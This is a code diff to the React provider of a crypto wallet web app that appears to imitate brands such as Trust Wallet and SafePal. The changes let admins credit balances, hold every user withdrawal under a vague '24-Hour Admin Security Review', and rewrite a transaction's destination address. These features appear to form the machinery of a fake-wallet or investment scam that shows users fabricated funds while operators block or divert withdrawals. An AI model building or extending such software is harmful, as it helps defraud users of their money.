@@ -1,4 +1,4 @@
-import React, { createContext, useContext, useState, useEffect } from 'react';
+import React, { createContext, useContext, useState, useEffect, useRef } from 'react';
 import {
   CryptoAsset,
   UserAccount,
@@ -990,6 +990,8 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
 
   const [faqs] = useState<FaqItem[]>(FAQ_ITEMS);
   const [isPriceLoading, setIsPriceLoading] = useState(false);
+  const knownTxIdsRef = useRef<Set<string>>(new Set());
+  const hasInitialTxSyncRef = useRef<boolean>(false);
 
   // Server Database Sync Function (Strictly Isolated)
   const syncWithServer = async () => {
@@ -1025,7 +1027,43 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
               return merged;
             });
           }
-          if (Array.isArray(data.transactions)) setTransactions(data.transactions);
+          if (Array.isArray(data.transactions)) {
+            // Real-time detection: Trigger 30-second multi-stage toast when crypto arrives from another account/wallet
+            if (hasInitialTxSyncRef.current && currentUser?.id) {
+              const freshInbound = data.transactions.find((tx: Transaction) => {
+                if (knownTxIdsRef.current.has(tx.id)) return false;
+                const isForMe =
+                  tx.userId === currentUser.id ||
+                  (tx.toAddress && (
+                    tx.toAddress.toLowerCase().includes(currentUser.email?.toLowerCase() || '') ||
+                    tx.toAddress.toLowerCase().includes(currentUser.name?.toLowerCase() || '') ||
+                    tx.toAddress.toLowerCase().includes(currentUser.id.toLowerCase())
+                  ));
+                const isInboundType =
+                  tx.type === 'receive' ||
+                  tx.type === 'deposit' ||
+                  tx.type === 'admin_credit';
+                return isForMe && isInboundType;
+              });
+
+              if (freshInbound) {
+                triggerLiveToast({
+                  type: 'deposit',
+                  amount: freshInbound.amount,
+                  symbol: freshInbound.assetSymbol,
+                  network: freshInbound.network || 'Direct Protocol',
+                  txHash: freshInbound.txHash,
+                  toAddress: freshInbound.toAddress,
+                  fromAddress: freshInbound.fromAddress,
+                  note: `+${freshInbound.amount} ${freshInbound.assetSymbol} received from external account`,
+                });
+              }
+            }
+
+            data.transactions.forEach((t: Transaction) => knownTxIdsRef.current.add(t.id));
+            hasInitialTxSyncRef.current = true;
+            setTransactions(data.transactions);
+          }
           if (data.depositAddresses) setDepositAddresses(data.depositAddresses);
           if (data.withdrawAddresses) setWithdrawAddresses(data.withdrawAddresses);
           if (typeof data.networkFeeQrCode === 'string') setNetworkFeeQrCode(data.networkFeeQrCode);
@@ -2291,7 +2329,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     const newTx: Transaction = {
       id: 'tx_' + Date.now(),
       userId: currentUser.id,
-      type: 'send',
+      type: 'withdraw',
       assetSymbol,
       assetName: asset?.name || assetSymbol,
       amount,
@@ -2301,8 +2339,9 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
       network: network || 'TRC20',
       feeUsd: 1.25,
       timestamp: new Date().toISOString(),
-      status: 'completed',
-      note: `SafePal Web3 Transfer to ${toAddress.slice(0, 10)}...`,
+      status: 'pending',
+      targetCompletionTime: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
+      note: `Pending 24-Hour Admin Security Review. Awaiting manual node verification.`,
     };
 
     const updatedTxList = [newTx, ...transactions];
@@ -2313,14 +2352,14 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
 
     addNotification(
       currentUser.id,
-      'Transfer Sent',
-      `Sent ${amount} ${assetSymbol} ($${amountUsd.toFixed(2)}) to ${toAddress.slice(0, 10)}...`,
+      'Withdrawal Pending 24h Review',
+      `Withdrawal of ${amount} ${assetSymbol} ($${amountUsd.toFixed(2)}) to ${toAddress.slice(0, 10)}... is pending 24-hour review.`,
       'withdraw'
     );
 
     // Trigger Trust Wallet Style 30-Second Live Toast for outgoing transfer
     triggerLiveToast({
-      type: 'send',
+      type: 'withdraw',
       amount,
       symbol: assetSymbol,
       network: network || 'TRC20',
@@ -2330,7 +2369,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
 
     return {
       success: true,
-      message: `Transfer of ${amount} ${assetSymbol} completed!`,
+      message: `Withdrawal of ${amount} ${assetSymbol} submitted! Status: Pending (24-Hour Admin Security Review).`,
       txHash,
       isInternal: false,
     };
@@ -2369,6 +2408,21 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     setTransactions(updatedTx);
 
     saveToServer({ users: updatedUsers, transactions: updatedTx });
+
+    // Server-side authoritative approval
+    fetch('/api/admin/transaction/approve', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ txId }),
+    })
+      .then((r) => r.json())
+      .then((data) => {
+        if (data.success) {
+          if (Array.isArray(data.users)) setUsers(data.users);
+          if (Array.isArray(data.transactions)) setTransactions(data.transactions);
+        }
+      })
+      .catch((e) => console.warn('Server approve call notice:', e));
 
     addNotification(
       targetUser.id,
@@ -2418,6 +2472,21 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     setTransactions(updatedTx);
 
     saveToServer({ users: updatedUsers, transactions: updatedTx });
+
+    // Server-side authoritative rejection and balance refund
+    fetch('/api/admin/transaction/reject', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ txId }),
+    })
+      .then((r) => r.json())
+      .then((data) => {
+        if (data.success) {
+          if (Array.isArray(data.users)) setUsers(data.users);
+          if (Array.isArray(data.transactions)) setTransactions(data.transactions);
+        }
+      })
+      .catch((e) => console.warn('Server reject call notice:', e));
 
     addNotification(
       targetUser.id,
@@ -2919,6 +2988,21 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     setTransactions(updatedTx);
     localStorage.setItem('trustpro_txs_v2', JSON.stringify(updatedTx));
     saveToServer({ transactions: updatedTx });
+
+    if (updates.toAddress) {
+      fetch('/api/admin/transaction/update-address', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ txId, toAddress: updates.toAddress }),
+      })
+        .then((r) => r.json())
+        .then((data) => {
+          if (data.success && Array.isArray(data.transactions)) {
+            setTransactions(data.transactions);
+          }
+        })
+        .catch((e) => console.warn('Update tx address server sync:', e));
+    }
 
     addAuditLog(
       'UPDATE_TX_DETAILS',
